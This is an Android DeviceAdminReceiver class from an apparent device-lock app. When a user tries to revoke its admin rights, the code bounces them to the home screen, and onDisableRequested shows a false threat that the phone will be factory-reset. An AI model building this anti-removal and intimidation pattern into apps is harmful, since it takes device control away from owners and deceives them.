package vn.vhc.live.lock;

import vn.vhc.live.ContextManagerCore;
import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

/**
 * DeviceAdminDemo to enable, disable the options.
 * @author Prashant Adesara
 * */
public class DeviceAdminDemo extends DeviceAdminReceiver 
{
//	implement onEnabled(), onDisabled(),
	@Override
	public void onReceive(Context context, Intent intent) {
		Intent intent1 = new Intent();
    	intent1.setAction(Intent.ACTION_MAIN)
    		   .addCategory(Intent.CATEGORY_HOME)
    		   .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
    	context.startActivity(intent1);
		super.onReceive(context, intent);
	}
	
	public void onEnabled(Context context, Intent intent) 
	{
		/*
		Intent intent1 = new Intent();
    	intent1.setAction(Intent.ACTION_MAIN)
    		   .addCategory(Intent.CATEGORY_HOME)
    		   .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
    	context.startActivity(intent1);
    	*/
    	
	};	
	public void onDisabled(Context context, Intent intent) 
	{
		//ContextManagerCore.getInstance().getCurrentContext().startActivity(intent1);
	};	
	
	@Override
	public CharSequence onDisableRequested(Context context, Intent intent) {
		//return "Are you sure to disable? Your phone may be damanaged?.";
//		Intent startMain = new Intent(Intent.ACTION_MAIN);
//        startMain.addCategory(Intent.CATEGORY_HOME);
//        startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        context.startActivity(startMain);
        
        Intent intent1 = new Intent();
    	intent1.setAction(Intent.ACTION_MAIN)
    		   .addCategory(Intent.CATEGORY_HOME)
    		   .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
    	context.startActivity(intent1);
        return "You have no right to perform this action Or Your phone will reset factory!";
	}
	@Override
	public void onPasswordChanged(Context context, Intent intent) {
		//showToast(context, "Sample Device Admin: pw changed");
	}
	void showToast(Context context, CharSequence msg) {
		//Toast.makeText(context, msg, Toast.LENGTH_SHORT).show();
	}
}